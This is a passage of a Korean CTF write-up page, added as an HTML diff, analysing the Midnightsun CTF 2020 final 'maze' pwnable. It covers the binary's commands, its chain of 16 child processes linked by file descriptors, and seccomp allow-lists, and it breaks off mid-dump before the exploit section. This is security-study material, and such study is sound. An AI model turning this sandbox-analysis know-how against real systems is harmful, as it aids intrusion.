@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
+  
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Midnightsun CTF Final maze WriteUp | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="Midnightsun CTF Final maze WriteUp" />
+<meta name="author" content="NextLine" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 이영주" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 이영주" />
+<link rel="canonical" href="http://202.182.127.225:4000/2020-10-01/Midnightsun-CTF-Final-Maze-WriteUp-3d95f806977a4a09a3c265a00e98d62d" />
+<meta property="og:url" content="http://202.182.127.225:4000/2020-10-01/Midnightsun-CTF-Final-Maze-WriteUp-3d95f806977a4a09a3c265a00e98d62d" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Midnightsun CTF Final maze WriteUp","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","author":{"@type":"Person","name":"NextLine"},"url":"http://202.182.127.225:4000/2020-10-01/Midnightsun-CTF-Final-Maze-WriteUp-3d95f806977a4a09a3c265a00e98d62d","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-10-01/Midnightsun-CTF-Final-Maze-WriteUp-3d95f806977a4a09a3c265a00e98d62d"},"description":"라온화이트햇 핵심연구팀 이영주","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+ 
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+   <h1 class="post-title">Midnightsun CTF Final maze WriteUp</h1>
+   <div class="post-line"></div>
+
+   
+      
+         
+            <span class="tag"><center><i>pwnable</i></center></span>
+         
+      
+         
+            <span class="tag"><center><i>CTF</i></center></span>
+         
+      
+   
+   
+   <ul>
+  <li><a href="#intro">Intro</a></li>
+  <li><a href="#binary">Binary</a></li>
+  <li><a href="#vulnerability">Vulnerability</a></li>
+  <li><a href="#exploit">Exploit</a></li>
+</ul>
+   
+   <p>라온화이트햇 핵심연구팀 이영주</p>
+
+<h2 id="intro">Intro</h2>
+
+<p><img src="/assets/2010joo.png" alt="/assets/2010joo..png" /></p>
+
+<p>올해 진행된 midnightsun CTF 2020 final에 출제된 maze 문제에 관한 writeup 입니다.</p>
+
+<h2 id="binary">Binary</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">youngjoo</span><span class="err">@</span><span class="mi">15</span><span class="n">b74879520e</span><span class="o">:~/</span><span class="n">maze</span><span class="err">$</span> <span class="n">file</span> <span class="n">maze</span>
+<span class="n">maze</span><span class="o">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">becacd430ec2ce230c5dde40525da4cd03510cfd</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2.0</span><span class="p">,</span> <span class="n">stripped</span>
+<span class="n">youngjoo</span><span class="err">@</span><span class="mi">15</span><span class="n">b74879520e</span><span class="o">:~/</span><span class="n">maze</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span>
+<span class="n">YOU</span> <span class="n">ARE</span> <span class="n">IN</span> <span class="n">A</span> <span class="n">MAZE</span> <span class="n">OF</span> <span class="n">TWISTY</span> <span class="n">LITTLE</span> <span class="n">SOCKETS</span><span class="p">,</span> <span class="n">ALL</span> <span class="n">ALIKE</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>바이너리는 64bit 이며 20.04 환경에서 동작하는 간단한 프로그램이었습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HELP</span>
+<span class="n">AVAILABLE</span> <span class="n">COMMANDS</span><span class="o">:</span>
+<span class="n">GO</span> <span class="o">&lt;</span><span class="n">DIRECTION</span><span class="o">&gt;</span>
+<span class="n">SHOUT</span> <span class="o">&lt;</span><span class="n">MESSAGE</span><span class="o">&gt;</span>
+<span class="n">OPEN</span> <span class="o">&lt;</span><span class="n">CONTAINER</span><span class="o">&gt;</span>
+<span class="n">ESCAPE</span>
+</code></pre></div></div>
+
+<p>기능은 4가지가 있었으며 각각 아래와 같은 동작을 했습니다.</p>
+
+<ol>
+  <li>GO <DIRECTION> : 구현되어 있지 않았습니다. ("IT'S PITCH BLACK. YOU CAN'T GO FURTHER" 출력)</DIRECTION></li>
+  <li>SHOUT <MESSAGE> : 인자로 전달해준 MESSAGE를 그대로 3번 출력해주었습니다.</MESSAGE></li>
+  <li>OPEN : flag.txt를 읽고 출력해줍니다.</li>
+  <li>ESCAPE : return 합니다.</li>
+</ol>
+
+<p>4가지 모두 별 기능은 없으나 중요한 점은 execvp와 seccomp였습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">youngjoo</span>    <span class="mi">73</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">2</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">74</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">516</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">3</span> <span class="mi">16</span> <span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">39</span>
+<span class="n">youngjoo</span>    <span class="mi">75</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">516</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">4</span> <span class="mi">16</span> <span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">45</span>
+<span class="n">youngjoo</span>    <span class="mi">76</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">516</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">5</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">29</span>
+<span class="n">youngjoo</span>    <span class="mi">77</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">6</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">35</span>
+<span class="n">youngjoo</span>    <span class="mi">78</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">7</span> <span class="mi">16</span> <span class="mi">12</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">79</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">8</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">80</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">9</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">31</span>
+<span class="n">youngjoo</span>    <span class="mi">81</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">10</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">82</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">11</span> <span class="mi">16</span> <span class="mi">18</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">83</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">12</span> <span class="mi">16</span> <span class="mi">20</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">49</span>
+<span class="n">youngjoo</span>    <span class="mi">84</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">13</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">85</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">516</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">14</span> <span class="mi">16</span> <span class="mi">22</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">86</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">15</span> <span class="mi">16</span> <span class="mi">24</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">87</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">580</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">16</span> <span class="mi">16</span> <span class="mi">26</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+<span class="n">youngjoo</span>    <span class="mi">88</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">2496</span>   <span class="mi">584</span> <span class="n">pts</span><span class="o">/</span><span class="mi">1</span>    <span class="n">S</span><span class="o">+</span>   <span class="mo">02</span><span class="o">:</span><span class="mi">31</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span> <span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">1</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span>
+</code></pre></div></div>
+
+<p>maze 바이너리를 실행하면 위와 같이 16개의 바이너리가 실행됩니다. maze의 첫번째 인자는 순서, 두번째 인자는 최대값, 세번째 인자는 통신할 수 있는 fd를 뜻합니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">1</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span> <span class="c1">// 27 -&gt; 28</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">5</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">29</span> <span class="c1">// 29 -&gt; 30</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">9</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">31</span> <span class="c1">// 31 -&gt; 32</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">13</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span> <span class="c1">// 21 -&gt; 22</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">14</span> <span class="mi">16</span> <span class="mi">22</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">0</span> <span class="c1">// 23 -&gt; 24</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">15</span> <span class="mi">16</span> <span class="mi">24</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">0</span> <span class="c1">// 25 -&gt; 26</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">16</span> <span class="mi">16</span> <span class="mi">26</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+</code></pre></div></div>
+
+<p>fd는 위처럼 이어져있습니다. 또한 /dev/urandom에 있는 값을 srand의 시드로 사용하기 때문에 랜덤하게 변경되는 fd들을 예측할 수 없었습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0003</span>
+ <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+ <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000000f</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">rt_sigreturn</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
+ <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x000000e7</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit_group</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">000</span><span class="mi">8</span>
+ <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0010</span>
+ <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000017</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">select</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
+ <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">read</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0014</span>
+ <span class="mo">0013</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0014</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000005</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">fstat</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0016</span>
+ <span class="mo">0015</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0016</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000008</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">lseek</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">001</span><span class="mi">8</span>
+ <span class="mo">0017</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">001</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">write</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0020</span>
+ <span class="mo">001</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0020</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">mmap</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0022</span>
+ <span class="mo">0021</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0022</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">close</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0024</span>
+ <span class="mo">0023</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0024</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</code></pre></div></div>
+
+<p>또한 16번째 프로세스, 즉 ./maze 15 16 ~~~~~인 프로세스를 제외하고 모든 프로세스는 위와 같은 seccomp가 걸려 있습니다. 따라서 OPEN 기능을 쓴다 해도 flag.txt를 읽을 수 없었습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0003</span>
+ <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+ <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000000f</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">rt_sigreturn</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0006</span>
+ <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x000000e7</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit_group</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">000</span><span class="mi">8</span>
+ <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0010</span>
+ <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000017</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">select</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
+ <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
